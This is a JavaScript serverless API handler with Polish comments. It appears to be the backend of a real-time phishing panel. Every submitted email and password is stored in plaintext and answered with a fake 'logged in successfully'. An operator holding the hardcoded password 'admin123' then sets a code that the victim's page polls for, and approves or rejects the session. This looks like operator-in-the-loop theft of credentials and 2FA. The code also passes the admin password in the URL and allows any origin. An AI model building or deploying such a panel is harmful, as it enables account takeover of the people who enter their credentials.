// api/index.js - POPRAWIONA WERSJA
let sessions = {};

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ============================================================
    // TEST - sprawdza czy API działa
    // ============================================================
    if (req.method === 'GET' && req.query.action === 'test') {
        return res.status(200).json({ 
            status: 'ok', 
            message: 'API działa!',
            timestamp: new Date().toISOString()
        });
    }

    // ============================================================
    // SESSION - logowanie (POST)
    // ============================================================
    if (req.method === 'POST' && req.query.action === 'session') {
        const { email, password, ip } = req.body;

        if (!email || !password) {
            return res.status(400).json({ error: 'Email i hasło wymagane' });
        }

        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
        
        sessions[sessionId] = {
            email,
            password,
            ip: ip || 'N/A',
            timestamp: new Date().toISOString(),
            code: null,
            verified: false,
            rejected: false,
            approved: false
        };

        return res.status(200).json({ 
            success: true, 
            sessionId: sessionId,
            message: 'Zalogowano pomyślnie.'
        });
    }

    // ============================================================
    // POLL - sprawdzanie statusu sesji (GET)
    // ============================================================
    if (req.method === 'GET' && req.query.action === 'poll') {
        const { sessionId } = req.query;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.status(200).json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    // ============================================================
    // SET-CODE - admin ustawia kod (POST)
    // ============================================================
    if (req.method === 'POST' && req.query.action === 'set-code') {
        const { sessionId, code, adminPassword } = req.body;

        if (!sessionId || !code) {
            return res.status(400).json({ error: 'Brak sessionId lub kodu' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.code = code;
        session.codeSetAt = new Date().toISOString();

        return res.status(200).json({ 
            success: true, 
            message: 'Kod ustawiony!'
        });
    }

    // ============================================================
    // APPROVE - admin zatwierdza (POST)
    // ============================================================
    if (req.method === 'POST' && req.query.action === 'approve') {
        const { sessionId, adminPassword } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.approved = true;
        session.verified = true;

        return res.status(200).json({ 
            success: true, 
            message: 'Użytkownik zatwierdzony!',
            approved: true
        });
    }

    // ============================================================
    // REJECT - admin odrzuca (POST)
    // ============================================================
    if (req.method === 'POST' && req.query.action === 'reject') {
        const { sessionId, adminPassword } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.rejected = true;

        return res.status(200).json({ 
            success: true, 
            message: 'Użytkownik odrzucony!',
            rejected: true
        });
    }

    // ============================================================
    // ADMIN SESSIONS - lista sesji (GET)
    // ============================================================
    if (req.method === 'GET' && req.query.action === 'sessions') {
        const { adminPassword } = req.query;

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const sessionList = Object.keys(sessions).map(id => {
            const s = sessions[id];
            return {
                sessionId: id,
                email: s.email,
                timestamp: s.timestamp,
                hasCode: !!s.code,
                verified: s.verified || false,
                rejected: s.rejected || false,
                approved: s.approved || false
            };
        });

        sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return res.status(200).json({ sessions: sessionList });
    }

    // ============================================================
    // Domyślnie - 404
    // ============================================================
    return res.status(404).json({ error: 'Nieznana akcja lub metoda' });
}
